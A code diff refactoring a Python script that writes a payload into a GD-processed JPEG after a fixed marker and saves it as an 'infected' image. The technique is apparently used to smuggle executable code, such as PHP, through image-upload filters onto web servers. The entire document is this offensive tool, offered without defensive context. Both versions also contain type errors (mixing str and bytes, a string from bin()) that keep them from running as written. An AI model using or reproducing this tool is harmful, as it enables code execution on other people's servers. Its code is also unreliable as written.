@@ -3,52 +3,51 @@ import sys
 import binascii
 import os
 
-magic_number = "03010002110311003f00" 
+MAGIC_NUMBER = "03010002110311003f00"
+BIN_MAGIC_NUMBER = binascii.unhexlify(MAGIC_NUMBER)
 
 def main():
+    path_to_vector_image = sys.argv[1]
+    payload_code = sys.argv[2]
+    path_to_output = sys.argv[3]
 
-    if len(sys.argv) != 4:
-        print("USAGE: <gd-jpeg> <payload> <output_name>")
-        sys.exit()
+    with open(path_to_vector_image, 'rb') as vector_file:
+        bin_vector_data = vector_file.read()
 
-    jpeg = sys.argv[1]
-    payload = sys.argv[2]
-    output = sys.argv[3]
+        print("[ ] Searching for magic number...")
+        magic_number_index = find_magic_number_index(bin_vector_data)
 
-    loc = find_injection_start_index(jpeg)
-    inject_payload(jpeg, loc, payload, output)
+        if magic_number_index >=0:
+            print("[+] Found magic number.")
+            with open(path_to_output, 'wb') as infected_file:
+                print("[ ] Injecting payload...")
+                infected_file.write(
+                    inject_payload(
+                        bin_vector_data,
+                        magic_number_index,
+                        payload_code))
+                print("[+] Payload written.")
+        else:
+            print("[-] Magic number not found. Exiting.")
 
-def find_injection_start_index(jpeg):
+def find_magic_number_index(
+        data: bytes) -> int:
+    return data.find(BIN_MAGIC_NUMBER)
 
-    print("Searching for magic number...")
-    f = open(jpeg, 'rb')
-    contents = f.read()
-    loc = contents.find(binascii.unhexlify(magic_number))
-    f.close()
-    
-    if loc:
-        print("Found magic number.")
-        return loc + len(binascii.unhexlify(magic_number))
-    else:
-        print("Magic number not found. Exiting.")
-        sys.exit()
+def inject_payload(
+        vector: bytes,
+        index: int,
+        payload: str) -> bytes:
 
-def inject_payload(jpeg, loc, payload, output):
+    bin_payload = bin(int(binascii.hexlify(payload), 16))
 
-    bin_payload = bytes(payload, 'utf-8')
+    pre_payload = vector[:index + len(BIN_MAGIC_NUMBER)]
+    post_payload = vector[index + len(BIN_MAGIC_NUMBER) + len(bin_payload):]
 
-    f = open(jpeg, 'rb')
-    fo = open(output, 'wb')
-    
-    print("Injecting payload...")
-    contents = f.read()
-    pre_payload = contents[:loc]
-    post_payload = contents[loc + len(payload):]
-    fo.write(pre_payload + payload + post_payload + '\n')
-    print("Payload written.")
-
-    f.close()
-    fo.close()
+    return (pre_payload + bin_payload + post_payload + '\n')
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) != 4:
+        print("USAGE: <jpeg file path> <payload code> <output path>")
+    else:
+        main()
